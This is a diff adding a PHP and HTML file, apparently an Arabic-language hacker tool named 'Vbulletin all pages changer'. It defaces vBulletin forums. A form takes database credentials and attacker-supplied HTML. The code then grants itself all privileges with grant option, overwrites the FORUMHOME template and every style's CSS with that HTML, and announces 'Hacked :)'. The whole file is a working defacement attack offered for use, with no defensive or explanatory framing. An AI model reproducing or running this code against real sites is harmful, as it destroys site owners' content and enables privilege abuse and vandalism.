@@ -1,0 +1,91 @@
+<style>
+input,textarea, form {
+	background-color: #000000;
+	border-width: 3px;
+	color: #FF0000;
+	font-family: tahoma;
+	font-size: 11px;
+}
+
+
+</style>
+<title> // Vbulletin all pages changer جميع الحقوق محفوظه لعالم المعرفه</title>
+<body bgcolor='#000000'>
+<form method =post >
+<p align='center'>&nbsp;</p>
+<p align='center'><b><font size="5">AL MA3REFAH VB ALL INDEX CHANGER</font></b></p>
+<p align='center'><font color='#FFFFFF'><b>Host :&nbsp;&nbsp;&nbsp;&nbsp; </b>&nbsp;
+</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <input type=text name=host value=localhost></br>
+<b><font color='#FFFFFF'>Database Name :</font></b> <input type=text name=db ></br>
+<b><font color='#FFFFFF'>User : </font>&nbsp;&nbsp; </b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <input type=text name=user ></br>
+<font color='#FFFFFF'><b>Password : </b>&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <input type=text name=pass ></p>
+<p align='center'><font color='#FFFFFF'></br>
+<b>ضع هنا الاندكس المراد تعليقه على الموقع :</b></font></br>
+<textarea type=text name=index  rows=23 cols=80></textarea>
+ </br>
+ <br>
+ <input type=submit name=ok value='Hacked!' ></br>
+
+<br>
+<br>
+<font color="#C0C0C0">
+<br>
+</font>
+</p>
+</form>
+<p align="center"><font color="#00FF00"><a href="mailto:a0m@hotmail.com">
+<span style="text-decoration: none"><font color="#FF0000">a0m</font><font color="#C0C0C0">@hotmail.com</font></span></a><font color="#C0C0C0">--</font></font><font color="#C0C0C0">all
+</font><font color="#FF0000">right</font><font color="#C0C0C0"> reserved-kinghacker</font></p>
+<p align="center"><span lang="ar-sa"><font color="#FF0000">السّيف</font></span></p>
+<p align="center">&nbsp;</p>
+
+<p align="center">&nbsp;</p>
+
+<p align="center">&nbsp;</p>
+
+
+<?php
+
+$HOST = $_POST['host'];
+$DB = $_POST['db'];
+$USER = $_POST['user'];
+$PASSWORD = $_POST['pass'];
+$index = $_POST['index'];
+
+
+if(isset($_POST['ok'])){
+$index =@mysql_escape_string($index);
+$connect=@mysql_connect($HOST,$USER,$PASSWORD);
+$select=@mysql_select_db($DB);
+
+if($select){
+
+$query = "GRANT ALL PRIVILEGES ON $DB.* TO $USER@$HOST WITH GRANT OPTION";
+$query1 ="UPDATE `template` SET `template` = '$index' WHERE `title` ='FORUMHOME';";
+$query2= "UPDATE `style` SET `css` = '$index' , `stylevars` = '', `csscolors` = '', `editorstyles` = '' ;";
+$query3 = "FLUSH PRIVILEGES";
+$result=@mysql_query($query);
+$result=@mysql_query($query1);
+$result=@mysql_query($query2);
+$result=@mysql_query($query3);
+
+if ($result){
+echo "<SCRIPT language=JavaScript>
+<!--
+// Hide the JavaScript from older browsers
+(window.alert('Hacked :)'))
+// End hiding of script
+// --></SCRIPT>";
+}
+}
+    else {
+
+echo "<SCRIPT language=JavaScript>
+<!--
+// Hide the JavaScript from older browsers
+(window.alert('the information is incorrect '))
+// End hiding of script
+// --></SCRIPT>";
+}
+}
+?>
